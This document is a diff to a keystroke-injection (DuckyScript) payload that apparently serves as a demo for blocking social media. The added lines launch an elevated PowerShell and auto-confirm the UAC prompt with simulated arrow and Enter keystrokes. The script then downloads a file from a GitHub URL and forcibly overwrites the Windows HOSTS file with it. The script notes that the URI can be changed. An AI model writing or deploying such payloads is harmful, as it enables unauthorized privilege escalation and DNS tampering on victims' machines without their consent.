@@ -7,9 +7,13 @@ GUI d
 DELAY 500
 GUI r
 DELAY 500
-STRING powershell.exe
+STRING powershell Start-Process powershell -Verb runAs
 ENTER
-DELAY 2000
+DELAY 4000
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 560
 REM *************************************************
 REM **   Deny all Social Media Websites
 REM ** ==================================
@@ -20,7 +24,8 @@ REM ** ==================================
 REM ** https://raw.githubusercontent.com/InfoSecREDD/REDD-Demo/main/DNS-POI/HOSTS
 REM *************************************************
 REM  - Change the URI to the correct path.
-STRING Start-Process -FilePath "powershell" -ArgumentList "/c cd $Env:temp;Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/InfoSecREDD/REDD-Demo/main/DNS-POI/killsocials.lst' -OutFile 'HOSTS';Copy-Item 'HOSTS' -Destination "$Env:windir\System32\drivers\etc\HOSTS" -Recurse -force;
+
+STRING cd $Env:temp;Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/InfoSecREDD/REDD-Demo/main/DNS-POI/killsocials.lst' -OutFile 'HOSTS';Copy-Item 'HOSTS' -Destination 'C:\Windows\System32\drivers\etc\HOSTS' -Recurse -force;
 ENTER
 DELAY 500
 GUI d
